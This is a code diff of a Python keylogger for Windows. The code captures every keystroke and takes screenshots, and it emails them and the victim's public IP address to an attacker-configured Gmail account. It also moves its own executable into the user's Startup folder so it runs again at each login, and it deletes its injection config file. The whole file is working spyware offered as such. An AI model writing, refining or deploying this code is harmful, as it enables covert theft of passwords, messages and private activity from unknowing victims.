@@ -1,4 +1,7 @@
 
+#@# -----------------------------------IMPORTS----------------------------------- #@#
+
+
 from pynput.keyboard import Key, Listener
 import smtplib, ssl
 import socket   
@@ -7,16 +10,31 @@ import os
 import getpass
 import sys
 import json
+import time
 import shutil
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 import pyautogui
 
+#%# ----CONSTANTS---- #%#
+
 keys = []
-keys_pressed = 0
+screenshot_number = 0
 
 
+#!# -----------------------------------STARTUP----------------------------------- #!#
+
+
+USER_NAME = getpass.getuser()
+Src = (sys.argv[0])
+Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
+try:
+    shutil.move(Src, Dest)
+except:
+    pass        
+
+#&# -----------------------------------JSON-FILES----------------------------------- #&#
 
 
 USER = os.getlogin()
@@ -38,25 +56,9 @@ except:
 
 JsonPath = f"{path}/config.json"
 
+#?# -----------------------------------EMAILS----------------------------------- #?#
 
-def screenshot(sender_email,receiver_email,sender_password):
-    msg = MIMEMultipart()
-    msg['From'] = sender_email
-    msg['To'] = receiver_email
-    msg['Subject'] = "SCREENSHOT"
-
-    # Attach the text message
-    msg.attach(MIMEText("screen", 'plain'))
-
-    screenshot = pyautogui.screenshot()
-    screenshot.save("./SCREENSHOT.png")
-    image_path = "./SCREENSHOT.png"
-    with open(image_path, "rb") as image_file:
-        image = MIMEImage(image_file.read())
-        image.add_header('Content-Disposition', 'attachment', filename="image.jpg")
-        msg.attach(image)
-        
-    # Connect to the SMTP server
+def email(sender_email,sender_password,receiver_email,option, message=None,screenshot=None):
     smtp_server = "smtp.gmail.com"  # Change this to your email provider's SMTP server
     smtp_port = 587  # Port for TLS
     smtp_username = sender_email
@@ -65,22 +67,38 @@ def screenshot(sender_email,receiver_email,sender_password):
     server = smtplib.SMTP(smtp_server, smtp_port)
     server.starttls()
     server.login(smtp_username, smtp_password)
+    
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    
+    if option == "screenshot": msg['Subject'] = "SCREENSHOT"
+    if option == "message": msg['Subject'] = "KEYS-LOGGED"
+    
 
-    # Send the email
+
+    if option == "screenshot":
+        screenshot.save("./SCREENSHOT.png")
+        image_path = "./SCREENSHOT.png"
+        msg.attach(MIMEText(f"{time.time()}", 'plain'))
+        with open(image_path, "rb") as image_file:
+            image = MIMEImage(image_file.read())
+            image.add_header('Content-Disposition', 'attachment', filename="image.jpg")
+            msg.attach(image)
+           
+            
+    elif option == "message":
+        msg.attach(MIMEText(f"{message}", "plain"))
+        
+
     server.sendmail(sender_email, receiver_email, msg.as_string())
     server.quit()
-    os.remove("./SCREENSHOT.PNG")
+    if option == "screenshot": os.remove("./SCREENSHOT.PNG")
 
 
-#!# -----------------------------------CAPS-LOCK----------------------------------- #!#
 
-def CapsStatus():
-    import ctypes
-    return True if ctypes.WinDLL("User32.dll").GetKeyState(0x14) else False
-
+#%# -----------------------------------HOST DATA----------------------------------- #%#
      
-#!# -----------------------------------LOGGER----------------------------------- #!#
-
 
 def get_ip_address(mode):
     url = 'https://api.ipify.org'
@@ -92,107 +110,103 @@ def get_ip_address(mode):
     elif mode == "ip":
         return ip_address
         
+#!# -----------------------------------LOGGER----------------------------------- #!#
+
+#&# ----CAPS-LOCK---- #&#
+
+def CapsStatus():
+    import ctypes
+    return True if ctypes.WinDLL("User32.dll").GetKeyState(0x14) else False
+
+#*# ----LOGGER---- #*#
 
 
 def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):                     
   
- 
- 
 
     with open(f"{JsonPath}","r") as file:
         parsed = json.load(file)
 
     mode = parsed['mode']
-        
-    Key_mode = True
-    Email_mode = False
-        
-    if mode == "email":
-        Key_mode = False
-        Email_mode = True
-    elif mode == "local":
-        Key_mode = True
-        Email_mode = False
-        
-    def email(keysGiven):
-        port = 465  # For SSL
-        smtp_server = "smtp.gmail.com"
-        sender_email = senderEmail
-        receiver_email = receiverEmail  
-        password = senderPassword
-        message = f"""\
-            Subject: KEYS 
 
-        {keysGiven}."""
+   
+    if mode == "email": Email_mode = True; Key_mode = False
+    elif mode == "local": Key_mode = True; Email_mode = False
 
-        context = ssl.create_default_context()
-        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message)
  
     
 #% ------------- KEY SYSTEM --------------- %#
     def on_press(key):
         
         global keys
-        global keys_pressed  
-        emailBool = False
+        sendBool = False
         if key == Key.space:
             key = " "
         elif key == Key.backspace:
             key = ""
             keys = keys[: -2]
-            keys_pressed =- 2
         elif key == Key.enter:
             key = "\n"
-            emailBool = True
+            sendBool = True
         elif key == "'":
             key = "_Apostro4phe_"
         elif key == "\x01":
             key = ""
         elif str(key).startswith("Key."):
             key = ""
-            keys_pressed =- 2
         
         
         if CapsStatus(): key = str(key); key = key.upper()  
         
-        
-#@ ------------- KEY MODE SYSTEM --------------- @#
+
+
+            
+#& ------------- KEY Saving SYSTEM --------------- &#
 
         keys.append(str(key))
-        keys_pressed += 1
-        if keys_pressed > 20 and Key_mode == True:   
-            file = open(f"./out/Spicy-Logs++", "a") 
-            UNmessage = "".join(keys)
-            message = UNmessage.replace("'","")
+        if sendBool == True:
+            global screenshot_number
+            message = "".join(keys)
+            message = message.replace("'","")
             message = message.replace("_Apostro4phe_","'")
-            file.write(str(message))
-            keys_pressed = 0 
-            keys = []
+            #! Email
+            if Email_mode == True:
+                email(senderEmail,senderPassword,receiverEmail,"message", message)
+                if Jscreenshot == True:
+                    screenshot = pyautogui.screenshot()
+                    email(senderEmail,senderPassword,receiverEmail,"screenshot",screenshot=screenshot)
+            #!Key
+            elif Key_mode == True:
+                try:   
+                    file = open(f"{path}/Log.txt", "a") 
+                except:
+                    file = open(f"{path}/Log.txt", "w")
+                
+                file.write(str(message))
+                try:
+                    os.mkdir(f"{path}/ScreenShots")
+                except:
+                    pass
+                if Jscreenshot == True:
+                    screenshot = pyautogui.screenshot()
+                    screenshot.save(f"{path}/ScreenShots/ScreenShot-{screenshot_number}.png")
+                    screenshot_number += 1
+                
             
-#& ------------- EMAIL MODE SYSTEM --------------- &#
-
-        if emailBool == True and Email_mode == True:
-            UNmessage = "".join(keys)
-            message = UNmessage.replace("'","")
-            message = message.replace("_Apostro4phe_","'")
-            email(message)
-            if Jscreenshot == False:
-                pass
-            else:
-                screenshot(senderEmail,receiverEmail,senderPassword)
-            emailBool = False
+            sendBool = False
             keys = []
+                
+
+            
+            
     def isMaillable():
-        global SendMail
-        try:
-            host_Data = get_ip_address(None)
-            email(f"Started Process || {host_Data}")
-            SendMail = True 
-        except Exception as e:
-            SendMail = False
-            print(e)
+        if Email_mode == True:
+            try:
+                host_Data = get_ip_address(None)
+                email(f"Started Process || {host_Data}")
+            except Exception as e:
+                    pass
+                
     with Listener(on_press=on_press) as listener :
         isMaillable()
         listener.join()
@@ -208,17 +222,15 @@ def check_config():
                 senderEmail = data["sender_email"]
                 senderPassword = data["sender_password"]
                 receiver_email = data["receiver_email"]
-            except:
-                return False
-            try:
                 mode = data["mode"]
-                             
+                screenshot = data["screenshot"]
             except:
-               
                 return False
-    except Exception as e:
+
+    except:
          return False
     return True
+
 
 try:
     with open(f"inject.json", "r") as Inject:
@@ -255,13 +267,3 @@ os.remove("inject.json")
 START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode, Jscreenshot)
 
 
-#!# -----------------------------------STARTUP----------------------------------- #!#
-
-
-USER_NAME = getpass.getuser()
-Src = (sys.argv[0])
-Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
-try:
-    shutil.move(Src, Dest)
-except:
-    pass        
